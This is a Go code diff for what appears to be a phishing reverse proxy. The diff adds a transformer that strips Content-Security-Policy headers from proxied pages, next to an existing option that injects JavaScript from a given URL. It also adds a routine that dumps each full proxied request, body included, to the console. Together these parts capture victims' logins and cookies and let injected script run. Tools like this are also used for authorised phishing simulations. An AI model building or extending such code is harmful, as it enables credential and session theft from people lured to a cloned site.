@@ -7,6 +7,7 @@ import (
 	"log"
 	"net"
 	"net/http"
+	"net/http/httputil"
 	_ "net/http/pprof"
 	"net/url"
 	"os"
@@ -119,7 +120,9 @@ func main() {
 
 	responseTransformers := []ResponseTransformer{
 		LocationRewritingResponseTransformer{},
+		CSPRemovingTransformer{},
 	}
+
 	if *javascriptURL != "" {
 		responseTransformers = append(responseTransformers, JavaScriptInjectionTransformer{javascriptURL: *javascriptURL})
 	}
@@ -160,6 +163,9 @@ func main() {
 		go plugin.ProcessTransactions(transactions, arguments)
 	}
 
+	// Log transactions to console
+	go logTransactions(transactions)
+
 	for {
 		conn, err := server.Accept()
 		if err != nil {
@@ -167,5 +173,26 @@ func main() {
 			continue
 		}
 		go phishingProxy.HandleConnection(conn, transactions)
+	}
+}
+
+func logTransactions(transactions <-chan plugins.HTTPTransaction) {
+	for transaction := range transactions {
+		request := transaction.Request
+		req, err := httputil.DumpRequest(&request, true)
+		if err != nil {
+			log.Println("Error dumping request to console.")
+			log.Println(err.Error())
+			return
+		}
+		log.Println(string(req))
+
+		resp, err := httputil.DumpResponse(&transaction.Response, false)
+		if err != nil {
+			log.Println("Error dumping response to console.")
+			log.Println(err.Error())
+			return
+		}
+		log.Println(string(resp))
 	}
 }
